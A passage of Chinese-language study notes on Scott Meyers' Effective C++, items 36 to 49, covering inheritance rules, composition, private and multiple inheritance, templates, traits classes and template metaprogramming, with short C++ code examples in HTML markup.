class="hljs-params">(writeStrategy)</span></span>;<br><br><span class="hljs-keyword">int</span> score1 = p1.score();<br><span class="hljs-keyword">int</span> score2 = p2.score();<br></code></pre></div></td></tr></table></figure><h3><span id="条款36绝不重新定义继承而来的non-virtual函数"><strong>条款36：绝不重新定义继承而来的non-virtual函数</strong></span></h3><p>任何情况下都不该重新定义一个继承而来的non-virtual函数。</p><h3><span id="条款37绝不重新定义继承而来的缺省参数值"><strong>条款37：绝不重新定义继承而来的缺省参数值</strong></span></h3><p>绝对不要重新定义一个继承而来的virtual成员函数缺省参数值，因为缺省参数值都是静态绑定（staticallybound），而virtual函数——你唯一应该覆写的东西——却是动态绑定（dynamicallybound）。</p><p>静态绑定的问题，当父类指针指向子类对象，其静态类型就为父类。动态绑定，则会根据所指对象，解析动态类型为子类。</p><p>若子类重新定义一个继承而来的virtual成员函数缺省参数值，会静态解析为父类中的缺省参数值，而不是子类中重新定义的值。可能会导致一些不易排查的错误。</p><p>一种解决方法，是使用non-virtual实现父类的带缺省参数值的成员函数，调用一个virtual的功能成员，传入缺省参数值。子类只需要重载virtual的功能成员。</p><h3><span id="条款38通过复合塑模出has-a关系"><strong>条款38：通过复合塑模出has-a关系</strong></span></h3><p>复合（composition）是类型之间的一种关系，指某种类型的对象内含其他类型的对象。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span><br>B component1;<br>    C component2;<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>当复合发生于应用域内的对象之间，表现出has-a的关系；当它发生于实现域内则是表现is-implemented-in-terms-of的关系。</p><p>应用域指逻辑上的关联，比如电脑由存储系统、IO系统、计算系统等组成。实现域指一个类的实现中使用了buffer、mutex、binarysearch tree等技术手段。</p><h3><span id="条款39明智而审慎地使用private继承"><strong>条款39：明智而审慎地使用private继承</strong></span></h3><p>Private 继承意味implemented-in-terms-of（根据某物实现出）。如果你让classD以private形式继承class B，你的用意是为了使用classB内某些特性和方法，不是因为B对象和D对象存在有任何观念上的关系。</p><p>private继承纯粹只是一种实现技术（继承自一个private baseclass的每样东西在你的class内都是private，因为它们都只是实现的细枝末节而已）。</p><p>Private继承在软件设计层面上没有意义，其意义只在于软件实现层面。</p><ul><li>Private继承意味is-implemented-in-termsof（根据某物实现出）。它通常比复合（composition）的级别低。</li><li>和复合（composition）不同，private继承可以造成emptybase最优化。这对致力于“对象尺寸最小化”的程序库开发者而言，可能很重要。</li></ul><p>因为 empty class 始终会占用 1字节的空间。若使用复合，那么加上alignment的影响，类的空间会存在一些浪费。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Defs</span> &#123;</span><br><span class="hljs-keyword">typedef</span> ...<br>...<br>&#125;;<br><br><span class="hljs-comment">// sizeof(A) == 8</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span><br><span class="hljs-keyword">int</span> x;<br>Defs df;<br>&#125;;<br><br><span class="hljs-comment">// sizeof(B) == 4</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span>:</span> <span class="hljs-keyword">private</span> Defs &#123;<br>  <span class="hljs-keyword">int</span> x;  <br>&#125;;<br></code></pre></div></td></tr></table></figure><h3><span id="条款40明智而审慎地使用多重继承"><strong>条款40：明智而审慎地使用多重继承</strong></span></h3><ul><li>多重继承比单一继承复杂。它可能导致新的歧义性，以及对virtual继承的需要。</li><li>virtual继承会增加大小、速度、初始化（及赋值）复杂度等等成本。如果virtualbase classes不带任何数据，将是最具实用价值的情况。</li><li>多重继承有其用途。比如，同时“public继承某个interfaceclass”和“private继承某个协助实现的class”。</li></ul><h2><span id="七-模板与泛型编程">七、模板与泛型编程</span></h2><h3><span id="条款41了解隐式接口和编译期多态"><strong>条款41：了解隐式接口和编译期多态</strong></span></h3><p>面向对象编程世界总是以显式接口（explicitinterface）和运行期多态（runtime polymorphism）解决问题。</p><p>Templates及泛型编程的世界，与面向对象有根本上的不同。泛型编程中显式接口和运行期多态仍然存在，但重要性降低。反倒是隐式接口（implicitinterfaces）和编译期多态（compile-time polymorphism）得到重视。</p><ul><li>class 和 template都支持接口（interfaces）和多态（polymorphism）。</li><li>对 class而言接口是显式的（explicit），以函数签名为中心。多态则是通过virtual函数发生于运行期。</li><li>对 template参数而言，接口是隐式的（implicit），它取决于T的具现化类型及其实现。多态则是通过template具现化和函数重载解析（functionoverloading resolution）发生于编译期。</li></ul><h3><span id="条款42了解typename的双重意义"><strong>条款42：了解typename的双重意义</strong></span></h3><p>template内出现的名称如果依赖某个template参数，称之为从属名称（dependentnames）。</p><p>如果解析器在template中遭遇一个嵌套从属名称，它便假设这名称不是个类型，除非你明确指明它是个类型。</p><p>任何时候当你想要在template中指涉一个嵌套从属类型名称，就必须在它前面加上关键字typename。</p><p>typename 不可以出现在 base classes list内的嵌套从属类型名称之前，也不可在member initializationlist（成员初值列）中作为base class修饰符。</p><ul><li>声明template参数时，前缀关键字class和typename可互换。</li><li>标识嵌套从属类型名称时，请使用关键字typename；但不得在base classlists（基类列）或member initialization list（成员初值列）内以它作为baseclass修饰符。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derived</span>:</span> <span class="hljs-keyword">public</span> Base&lt;T&gt;::Nested &#123; <span class="hljs-comment">// base class list 不允许typename</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// member initialization list 不允许typename</span><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Derived</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span>: Base&lt;T&gt;::<span class="hljs-title">Nested</span><span class="hljs-params">(x)</span> </span>&#123;<br>        <span class="hljs-keyword">typename</span> Base&lt;T&gt;::Nested temp; <span class="hljs-comment">// dependent names</span><br>    &#125;<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3><span id="条款43学习处理模板化基类内的名称"><strong>条款43：学习处理模板化基类内的名称</strong></span></h3><p>可在derived class templates内通过 "this-&gt;；" 指涉base classtemplate内的成员，而不只是在特化的class template中寻找成员。例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MsgSender</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">encryptedSend</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MsgSender</span>&lt;CompanyK&gt; &#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">// 没有send</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">encryptedSend</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;...&#125;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogSender</span>:</span> <span class="hljs-keyword">public</span> MsgSender&lt;Company&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sendLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;<br>        ...<br>        <span class="hljs-comment">// 当 Company 为 CompanyK，出错</span><br>        <span class="hljs-comment">// 因为没有send，只是在MsgSender&lt;CompanyK&gt;中找成员</span><br>        send(info);<br>        ...<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">// Solution</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogSender</span>:</span> <span class="hljs-keyword">public</span> MsgSender&lt;Company&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sendLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;<br>        ...<br>        <span class="hljs-comment">// 可在 template&lt;typename Company&gt; class MsgSender 中找成员</span><br>        <span class="hljs-keyword">this</span>-&gt;send(info);<br>        ...<br>    &#125;<br>&#125;;<br><span class="hljs-comment">// 或者</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogSender</span>:</span> <span class="hljs-keyword">public</span> MsgSender&lt;Company&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 告诉编译器</span><br>    <span class="hljs-keyword">using</span> MsgSender&lt;Company&gt;::send;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sendLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;<br>        ...<br>        send(info);<br>        ...<br>    &#125;<br>&#125;;<br><span class="hljs-comment">// 或者</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Company&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogSender</span>:</span> <span class="hljs-keyword">public</span> MsgSender&lt;Company&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sendLog</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MsgInfo&amp; info)</span> </span>&#123;<br>        ...<br>        <span class="hljs-comment">// 明确指出</span><br>        MsgSender&lt;Company&gt;::send(info);<br>        ...<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款44将与参数无关的代码抽离"><strong>条款44：将与参数无关的代码抽离</strong></span></h3><ul><li>Templates生成多个classes和多个函数，所以任何template代码都不该与某个造成膨胀的template参数产生依赖关系。</li><li>因非类型模板参数（non-type template parameters，比如n）而造成的代码膨胀，往往可消除，做法是以函数参数或class成员变量替换template参数。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> n&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Matrix</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">invert</span><span class="hljs-params">()</span></span>;<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>使用以上Matrix，其 Matrix&lt;int, 5&gt; 和 Matrix&lt;int, 10&gt;会产生两套处理n不同，其他都类似的 invert 代码，造成代码膨胀。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatrixBase</span> &#123;</span><br><span class="hljs-keyword">protected</span>:<br>    MatrixBase(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> n, T* pMem): msize(n), pData(pMem) &#123;<br>...<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setDataPtr</span><span class="hljs-params">(T* ptr)</span> </span>&#123;pData = ptr;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">invert</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> fsize)</span> </span>&#123;<br>    ...<br>    &#125;<br>    ...<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> msize;<br>    T* pData;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> n&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Matrix</span>:</span> <span class="hljs-keyword">private</span> MatrixBase&lt;T&gt; &#123;<br><span class="hljs-keyword">using</span> MatrixBase&lt;T&gt;::invert;  <span class="hljs-comment">// 使用Base的invert</span><br><span class="hljs-keyword">public</span>:<br>    Matrix(): MatrixBase&lt;T&gt;(n, <span class="hljs-literal">nullptr</span>),<br>    pData(<span class="hljs-keyword">new</span> T[n * n]) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;setDataPtr(pData.<span class="hljs-built_in">get</span>());<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">invert</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">this</span>-&gt;invert(n); &#125;<br>    ...<br><span class="hljs-keyword">private</span>:<br>boost::scoped_array&lt;T&gt; pData;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>以上就只有一份 invert代码，是一种解决方式。并且使用指针传递数据地址，进一步与 n参数分离。</p><ul><li>因类型参数（type parameters，比如int、long等）而造成的代码膨胀，往往可降低，做法是让带有完全相同二进制表述（binaryrepresentations）的具现类型（instantiationtypes）共享实现码。比如，STL中，vector、list等，在实现操作强类型指针 T*的成员函数时，都调用了一个操作 void*的成员函数，由后者完成实际工作，避免代码膨胀。</li></ul><h3><span id="条款45运用成员函数模板接受所有兼容类型"><strong>条款45：运用成员函数模板接受所有兼容类型</strong></span></h3><ul><li>请使用member functiontemplates（成员函数模板）生成“可接受所有兼容类型”的函数。</li><li>如果你声明 member templates用于“泛化copy构造”或“泛化assignment操作”，你还是需要声明正常的copy构造函数和copyassignment操作符。因为泛化copy构造并不会阻止编译器生成默认的copy构造函数。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">shared_ptr</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// copy constructor</span><br>    <span class="hljs-built_in">shared_ptr</span>(<span class="hljs-keyword">const</span> <span class="hljs-built_in">shared_ptr</span>&amp; rhs);<br>    <span class="hljs-comment">// templated copy constructor</span><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Y</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-title">shared_ptr</span>(<span class="hljs-title">const</span> <span class="hljs-title">shared_ptr</span>&lt;Y&gt;&amp; <span class="hljs-title">rhs</span>);</span><br>    <span class="hljs-comment">// copy assignment</span><br>    <span class="hljs-built_in">shared_ptr</span>&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> <span class="hljs-built_in">shared_ptr</span>&amp; rhs);<br>    <span class="hljs-comment">// templated copy assignment</span><br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Y</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-title">shared_ptr</span>&amp; <span class="hljs-title">operator</span>=(<span class="hljs-title">const</span> <span class="hljs-title">shared_ptr</span>&lt;Y&gt;&amp; <span class="hljs-title">rhs</span>);</span><br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款46需要类型转换时请为模板定义非成员函数"><strong>条款46：需要类型转换时请为模板定义非成员函数</strong></span></h3><p>当我们编写一个class template，实现一个外部函数 functiontemplate，其所有参数需要进行classtemplate的隐式类型转换时，请将这个外部函数定义为 class template 内部的friend 函数。</p><p>因为 function template在对实参进行类型推导时，从不考虑通过构造函数进行的隐式类型转换。</p><p>这里 friend 的作用不再是为了外部函数访问 class 的 non-public部分，而是创建一个 non-member function，以此来完成实参的类型的隐式转换。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">const</span> <span class="hljs-title">Rational</span>&lt;T&gt; <span class="hljs-title">doMultiply</span>(<span class="hljs-title">const</span> <span class="hljs-title">Rational</span>&lt;T&gt;&amp; <span class="hljs-title">lhs</span>,</span><br><span class="hljs-class">                             <span class="hljs-title">const</span> <span class="hljs-title">Rational</span>&lt;T&gt;&amp; <span class="hljs-title">rhs</span>);</span> <span class="hljs-comment">// declare</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">Rational</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 完成模板具体化</span><br>    <span class="hljs-keyword">friend</span> <span class="hljs-keyword">const</span> Rational&lt;T&gt; <span class="hljs-keyword">operator</span>*(<span class="hljs-keyword">const</span> Rational&lt;T&gt;&amp; lhs,<br>                                       <span class="hljs-keyword">const</span> Rational&lt;T&gt;&amp; rhs) &#123;<br>        <span class="hljs-keyword">return</span> doMultiply(lhs, rhs);<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">const</span> <span class="hljs-title">Rational</span>&lt;T&gt; <span class="hljs-title">doMultiply</span>(<span class="hljs-title">const</span> <span class="hljs-title">Rational</span>&lt;T&gt;&amp; <span class="hljs-title">lhs</span>,</span><br><span class="hljs-class">                             <span class="hljs-title">const</span> <span class="hljs-title">Rational</span>&lt;T&gt;&amp; <span class="hljs-title">rhs</span>) &#123;</span><br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款47请使用traitsclasses表现类型信息"><strong>条款47：请使用traitsclasses表现类型信息</strong></span></h3><p>STL中 iterator 的一个示例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">list_iterator</span> &#123;</span> <br>  <span class="hljs-keyword">typedef</span> bidirectional_iterator_tag     iterator_category;<br>  <span class="hljs-keyword">typedef</span> T                              value_type;<br>  <span class="hljs-keyword">typedef</span> T*                             pointer;<br>  <span class="hljs-keyword">typedef</span> T&amp;                             reference;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">ptrdiff_t</span>                      difference_type;<br>  ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>trait class常见设计如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//使用iterator提供的类型信息</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Iterator&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iterator_traits</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Iterator::iterator_category iterator_category;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Iterator::value_type        value_typep;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Iterator::difference_type   difference_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Iterator::pointer           pointer;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Iterator::reference         reference;<br>&#125;;<br><br><span class="hljs-comment">// 指针偏特化。</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iterator_traits</span>&lt;T *&gt;</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">typedef</span> random_access_iterator_tag iterator_category;<br>  <span class="hljs-keyword">typedef</span> T                          value_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">ptrdiff_t</span>                  difference_type;<br>  <span class="hljs-keyword">typedef</span> T*                         pointer;<br>  <span class="hljs-keyword">typedef</span> T&amp;                         reference;<br>&#125;;<br><br><span class="hljs-comment">// const指针偏特化</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iterator_traits</span>&lt;const T *&gt;</span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">typedef</span> random_access_iterator_tag iterator_category;<br>  <span class="hljs-keyword">typedef</span> T                          value_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">ptrdiff_t</span>                  difference_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">const</span> T*                   pointer;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">const</span> T&amp;                   reference;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>常见使用：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> iterator_traits&lt;Iterator&gt;::iterator_category category;<br></code></pre></div></td></tr></table></figure><p>iterator_traits 在编译期获取 iterator_category 等信息。</p><p>请记住：</p><ul><li>Traits classes使得“类型相关信息”在编译期可用。它们通过 templates 和templates特化实现。</li><li>整合重载技术（overloading）后，traits classes有可能在编译期对类型执行if...else测试。</li></ul><h3><span id="条款48认识template元编程"><strong>条款48：认识template元编程</strong></span></h3><p>Template metaprogramming（TMP，模板元编程）是编写template-basedC++程序并执行于编译期的过程。一旦TMP程序结束执行，其输出，也就是从templates 具体生成的若干C++源码，便会一如往常地被编译。</p><p>一个 TMP 递归程序：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">unsigned</span> n&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Factorial</span> &#123;</span><br>    <span class="hljs-keyword">enum</span> &#123; value = n * Factorial&lt;n - <span class="hljs-number">1</span>&gt;::value &#125;;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;&gt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Factorial</span>&lt;0&gt; &#123;</span><br>    <span class="hljs-keyword">enum</span> &#123; value = <span class="hljs-number">1</span> &#125;;<br>&#125;;<br><br>...<br><span class="hljs-keyword">int</span> f6 = Factorial&lt;<span class="hljs-number">6</span>&gt;::value;<br></code></pre></div></td></tr></table></figure><ul><li>Templatemetaprogramming（TMP，模板元编程）可将工作由运行期移往编译期，因而得以实现早期错误侦测和更高的执行效率。</li><li>TMP 可被用来生成“基于策略选择组合”（based on combinations of policychoices）的定制代码，可用于实现多种设计模式，也可用来避免生成对某些特殊类型并不适合的代码。</li></ul><h2><span id="八-定制new和delete">八、定制new和delete</span></h2><h3><span id="条款49了解new-handler的行为"><strong>条款49：了解new-handler的行为</strong></span></h3><ul><li>set_new_handler允许客户指定一个函数，在内存分配无法获得满足时被调用。</li><li>nothrow 